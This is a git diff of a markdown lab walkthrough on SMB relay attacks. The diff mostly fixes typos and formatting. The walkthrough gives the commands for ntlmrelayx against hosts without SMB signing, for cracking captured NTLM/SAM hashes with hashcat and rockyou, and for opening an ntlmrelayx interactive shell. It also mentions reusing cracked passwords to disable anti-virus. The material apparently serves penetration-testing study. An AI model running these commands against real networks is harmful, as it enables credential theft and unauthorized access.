@@ -52,24 +52,23 @@ Note: We are looking for SMB signing _not required_ for this to work.  Also, not
 #### Restart Responder, and in an new terminal start a tool called `ntlmrelayx` on our attackbox:
 Syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
 The targets.txt will contain the ip's of the clients we just identified with nmap that have SMB signing disabled.
-#### Login in to the Windows machine and try to access a share we know is invalid on the network, our eth0: \\\10.0.2.30
+#### Login in to the Windows machine and try to access a share we know is invalid on the network like our eth0: \\\10.0.2.30
 <img width="807" alt="Screen Shot 2022-08-28 at 4 50 59 PM" src="https://user-images.githubusercontent.com/76034874/187099849-3124a8c9-e6f5-4a02-8f6b-cd5920650f42.png">
 
-#### We can see the hashes come through. We can either crack these or relay them.  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program (so we could disable it) or another client on the network.
+#### We can see the hashes come through. We can either crack these or attemp to relay them (another lesson).  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program (so we could disable it) or another client on the network.
 ![image](https://user-images.githubusercontent.com/76034874/187008490-680f5243-efc4-4a78-b269-2558b2188c1b.png)
 
-### Cracking SAM hashes. SAM hashes are NTLM hashes so will require a differnt mode in hashcat. 1st save the hashes to a file `nano hashes.txt`
+### Cracking SAM hashes. SAM hashes are NTLM hashes so will require a different mode in hashcat. 1st save the hashes to a file `nano hashes.txt`
 ![image](https://user-images.githubusercontent.com/76034874/187314134-530e8d81-51a2-487b-9f3d-44c997c963da.png)
 
-### Syntax: hashcat -O -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+### Use hashcat
+### Syntax: `hashcat -O -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
+### Then list out any cracked passwords:
+Syntax: `hashcat -m1000 --show --usernames hashes.txt`
 ![image](https://user-images.githubusercontent.com/76034874/187315305-897906ec-2466-4551-8f59-70cc4ef482eb.png)
 
-###Then list out any cracked passwords:
-Syntax: `hashcat -m1000 --show --usernames hashes.txt`
-![image](https://user-images.githubusercontent.com/76034874/187315627-39471cf4-5393-4dfe-8a11-69d5c5fb3fd0.png)
 
-
-#### Interactive Mode:  Another nice feature of ntlmrelayx we can leverage is its ability to create an interactive shell:
+### Interactive Mode:  Another nice feature of ntlmrelayx we can leverage is its ability to create an interactive shell:
 syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`
 ![image](https://user-images.githubusercontent.com/76034874/187008783-7a4a8830-4796-495e-b1a1-8efafd69e439.png)
 
